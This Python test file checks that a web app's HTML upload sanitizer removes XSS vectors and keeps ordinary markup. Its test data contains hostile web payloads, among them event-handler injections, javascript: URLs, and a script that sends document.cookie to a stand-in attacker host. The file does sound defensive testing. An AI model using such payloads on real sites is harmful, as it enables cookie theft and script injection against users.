# Copyright 2026 Particular LLC. MOHIO(TM) is a trademark of Particular LLC.
# Licensed under the Mohio Business Source License 1.1 (BSL). See LICENSE and LICENSE-SCOPE.md.
"""
Guard: an uploaded HTML file is cleaned before it is stored.

`accept html` is allowed on the free tier, which makes an uploaded page the one upload
that can attack whoever opens it later. The file is sanitized at upload time and only
the cleaned version reaches disk -- the original is discarded.

Two properties matter and both are asserted here: everything dangerous is removed, and
ordinary markup survives (a sanitizer that eats the content is not usable). The third
is that a MISSING sanitizer refuses the upload rather than quietly writing the file as
it arrived, which would be the worst outcome: a deployment that looks protected and
is not.
"""
import os, sys, tempfile, shutil
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
import mohio_data
os.environ.setdefault("DATABASE_URL", ":memory:")
os.environ.setdefault("MOHIO_ENCRYPTION_KEY", "testkey")
os.environ.setdefault("MOHIO_SECRET", "testsecret")
_STORE = tempfile.mkdtemp(prefix="mohio_html_uploads_")
os.environ["MOHIO_UPLOAD_DIR"] = _STORE

from lark import Lark
from mohio_transformer_ast import transform
from mohio_interpreter import MohioInterpreter
from mohio_server import MohioServer, create_app
from starlette.testclient import TestClient
from mohio_html_sanitize import sanitize_html, SANITIZED_EXTENSIONS

_passed = _failed = 0
def check(label, got, want):
    global _passed, _failed
    if got == want:
        _passed += 1; print(f"  ok   {label}")
    else:
        _failed += 1; print(f"  FAIL {label}: got {got!r} want {want!r}")

def absent(label, needle, markup):
    check(label, needle.lower() in sanitize_html(markup).lower(), False)

def present(label, needle, markup):
    check(label, needle.lower() in sanitize_html(markup).lower(), True)

print("test_html_upload_sanitize")

# Every vector named in the upload ruling.
absent("script tag removed",        "script",     '<p>ok</p><script>alert(1)</script>')
absent("onerror removed",           "onerror",    '<img src=x onerror="alert(1)">')
absent("onclick removed",           "onclick",    '<div onclick="steal()">hi</div>')
absent("onload removed",            "onload",     '<body onload="alert(1)">hi</body>')
absent("javascript: URL removed",   "javascript:", '<a href="javascript:alert(1)">c</a>')
absent("data: URL removed",         "data:",      '<a href="data:text/html,x">c</a>')
absent("CSS expression removed",    "expression", '<div style="width:expression(alert(1))">x</div>')
absent("meta refresh removed",      "http-equiv", '<meta http-equiv="refresh" content="0;url=http://evil">')
absent("base tag removed",          "<base",      '<base href="http://evil.com/">')
absent("object removed",            "object",     '<object data="e.swf"></object>')
absent("embed removed",             "embed",      '<embed src="e.swf">')
absent("applet removed",            "applet",     '<applet code="E.class"></applet>')
absent("svg script removed",        "script",     '<svg><script>alert(1)</script></svg>')
absent("malformed img xss removed", "onerror",    '<img src=x onerror=alert(1)//>')
absent("form action removed",       "action",     '<form action="http://evil.com"></form>')
absent("iframe removed",            "iframe",     '<iframe src="http://evil.com"></iframe>')
absent("inline style dropped",      "style=",     '<p style="color:red">x</p>')

# A sanitizer that destroys ordinary content is not usable.
present("headings survive",   "<h1>",      '<h1>Title</h1>')
present("paragraphs survive", "<p>",       '<p>Hello</p>')
present("bold survives",      "<strong>",  '<p><strong>hi</strong></p>')
present("https links survive", 'href="https://example.com"', '<a href="https://example.com">l</a>')
present("images survive",     'src="https://example.com/a.png"',
        '<img src="https://example.com/a.png" alt="a">')
present("tables survive",     "<td>",      '<table><tr><td>cell</td></tr></table>')

# The extensions that get cleaned.
check("html/htm/xhtml are the sanitized set",
      sorted(SANITIZED_EXTENSIONS), ["htm", "html", "xhtml"])

# End to end: what lands on disk is the cleaned file, not what was uploaded.
SRC = ('shape D\n'
       '    f as file accept html, images max size 5mb\n'
       'shape: done\n\n'
       'listen for\n'
       '    new sh.D at /u\n'
       '        give back ok "stored"\n'
       '    new: done\n'
       'listen: done\n')
_g = mohio_data.GRAMMAR_PATH.read_text(encoding="utf-8")
_g = "\n".join(l for l in _g.splitlines() if not l.strip().startswith("//"))
_P = Lark(_g, parser="earley", ambiguity="resolve", propagate_positions=True)
interp = MohioInterpreter()
client = TestClient(create_app(MohioServer(transform(_P.parse(SRC), SRC), interp)),
                    raise_server_exceptions=False)
token = interp._issue_csrf()
hostile = (b'<h1>Newsletter</h1><p>Hello</p>'
           b'<script>fetch("http://evil/"+document.cookie)</script>'
           b'<img src=x onerror="alert(1)"><iframe src="http://evil"></iframe>')
resp = client.post("/u", data={"_csrf": token},
                   files={"f": ("page.html", hostile, "text/html")})
check("hostile html upload is accepted", "stored" in resp.text, True)

stored = [os.path.join(_STORE, f) for f in os.listdir(_STORE) if f.endswith(".html")]
check("exactly one html file stored", len(stored), 1)
on_disk = open(stored[0], encoding="utf-8").read() if stored else ""
check("stored file has no script", "script" in on_disk.lower(), False)
check("stored file has no onerror", "onerror" in on_disk.lower(), False)
check("stored file has no iframe", "iframe" in on_disk.lower(), False)
check("stored file kept the real content", "<h1>Newsletter</h1>" in on_disk, True)

shutil.rmtree(_STORE, ignore_errors=True)
print(f"\nRESULTS: {_passed} passed, {_failed} failed")
sys.exit(1 if _failed else 0)
